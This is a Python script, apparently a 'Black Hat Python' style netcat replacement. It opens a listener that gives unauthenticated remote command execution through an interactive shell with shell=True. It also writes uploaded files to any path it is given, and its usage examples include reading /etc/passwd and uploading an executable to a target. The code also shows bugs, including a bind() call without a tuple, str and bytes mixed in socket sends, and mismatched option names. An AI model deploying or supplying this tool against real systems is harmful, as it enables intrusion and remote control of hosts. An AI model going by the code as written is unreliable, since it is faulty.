import sys
import socket
import getopt
import threading
import subprocess

#global var
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def run_command(cmd):
    """runs a command and return the output
    """
    cmd = cmd.strip()

    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError as e:
        output = e.output

    return output

#handling incoming client connections
def client_handler(client_socket):
    global upload
    global execute
    global command

    #check for upload availables
    if len(upload_destination):

        file_buffer = ""

        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

    try:
        with open (upload_destination, "wb") as file_descriptor:
            file_descriptor.write(file_buffer.encode("utf-8"))
        client_socket.send(f"Successfully saved file to {upload_destination}")
    except OSError as e:
        client_socket.send(f"Failed to save file to {upload_destination} due to OS Error.\n Details: {e}") 

    #check for command execution
    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    #check if a command shell is requested
    if command:

        while True:
            client_socket.send("<BHP:#>".encode("utf-8"))

            #open to reception until we grab a linefeed (== enter key)
            cmd_buffer = b""
            while b"\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            
            #execute and send back results
            response = run_command(cmd_buffer)
            client_socket.send(response)

#let's work on incoming connections:
def server_loop():
    global target
    global port

    #if target undefined we listen to all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(target, port)
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        #thread to handle our new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

#if we are not listening, we are a client. Then:
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((target, port))

        #if we detect input from stdin, we'll send it, if not we keep waiting
        if len(buffer):
            client.send(buffer.encode("utf-8"))

        while True:
            recv_len = 1
            response = b""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
            
            print (response.decode("utf-8"), end=" ")

            #wait for further input and then send it off
            buffer = input("")
            buffer += "\n"
            client.send(buffer.encode("utf-8"))

    except socket.error as e:
        print(f"[*] Exception caught. Exiting.")
        print(f"[*] Details of error: {e}")
        client.close()

#write the function that will print the instructions if an unknown input is intered
def usage_info():
    print("Netcat Replacement")
    print("")
    print("Usage: bhp_net.py -t target_host -p port")
    print("-l --listen                  - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run     - execute the given file upon receiving a connection")
    print("-c --command                 - initialize a command shell")
    print("-u --upload=destination      - upon receiving a connection upload a file and write it to [destination]")
    print("")
    print("")
    print("Examples:")
    print("bph_net.py -t 192.168.0.1 -p 555 -l -c")
    print("bph_net.py -t 192.168.0.1 -p 555 -l -u=c\\target.exe")
    print("bph_net.py -t 192.168.0.1 -p 555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFHI' |./bhp_net.py -t 192.168.11.12 -p 135")
    sys.exit()

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage_info()

    #read the command line options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute", "target", "port", "command", "upload"])
        for o, a in opts:
            if o in ("-h", "--help"):
                usage_info()
            elif o in ("-l", "--listen"):
                listen = True
            elif o in ("-e", "--execute"):
                execute = a
            elif o in ("-c", "--commandshell"):
                command = True
            elif o in ("-u", "--upload"):
                upload_destination = a
            elif o in ("-t", "--target"):
                target = a
            elif o in ("-p", "--port"):
                port = int(a)
            else:
                assert False, "Unhandled option"
    
    except getopt.GetoptError as e:
        print(str(e))
        usage_info()

    if not listen and len(target) and port >0:
        #read the buffer from command line
        #this is blockin, so if not sendin input, unlock with CTRL-D
        buffer = sys.stdin.read()

        #send the data off
        client_sender(buffer)

    if listen:
        server_loop()

main()    
